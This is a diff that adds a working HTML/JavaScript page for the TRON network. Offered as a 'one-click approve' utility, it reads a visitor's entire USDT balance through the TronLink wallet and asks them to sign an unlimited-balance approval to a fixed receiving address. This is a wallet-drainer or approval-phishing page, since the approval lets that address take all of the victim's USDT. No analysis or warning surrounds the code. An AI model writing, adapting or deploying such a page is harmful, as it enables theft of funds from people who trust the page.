@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>One-Click Approve Full USDT Balance (TRON)</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    max-width: 600px;
+    margin: 50px auto;
+    text-align: center;
+  }
+  button {
+    font-size: 16px;
+    padding: 14px 30px;
+    cursor: pointer;
+  }
+  #status {
+    margin-top: 20px;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+  <h1>One-Click Approve Full USDT Balance</h1>
+  <p>Approve to address: <strong>TXANJkFC4xfzUdHWCHoP7evqsHviatP1kU</strong></p>
+  <p>Please install and login to <strong>TronLink</strong> wallet first</p>
+
+  <button id="btnApprove">Approve Full USDT Balance</button>
+  <div id="status">Waiting for action...</div>
+
+<script>
+const usdtContract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";  // TRC20 USDT mainnet contract
+const spender = "TXANJkFC4xfzUdHWCHoP7evqsHviatP1kU";        // Your receiving address
+const decimals = 6;
+
+async function approveAll() {
+  const statusEl = document.getElementById("status");
+  try {
+    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+      statusEl.innerText = "Please install and login to TronLink wallet";
+      return;
+    }
+    const tronWeb = window.tronWeb;
+    const from = tronWeb.defaultAddress.base58;
+    statusEl.innerText = "Fetching USDT balance...";
+    const contract = await tronWeb.contract().at(usdtContract);
+
+    let balanceRaw = await contract.balanceOf(from).call();
+    const bnBalance = tronWeb.toBigNumber(balanceRaw.toString());
+
+    if (bnBalance.isZero()) {
+      statusEl.innerText = "Your USDT balance is 0, cannot approve.";
+      return;
+    }
+
+    statusEl.innerText = `Sending approve transaction for ${bnBalance.div(10 ** decimals).toFixed(decimals)} USDT, please sign in TronLink...`;
+
+    const tx = await contract.approve(spender, bnBalance).send({feeLimit: 100_000_000});
+
+    statusEl.innerText = "Approve successful! Transaction ID: " + tx;
+  } catch(e) {
+    console.error(e);
+    statusEl.innerText = "Approve failed: " + (e.message || e);
+  }
+}
+
+document.getElementById("btnApprove").addEventListener("click", approveAll);
+</script>
+</body>
+</html>
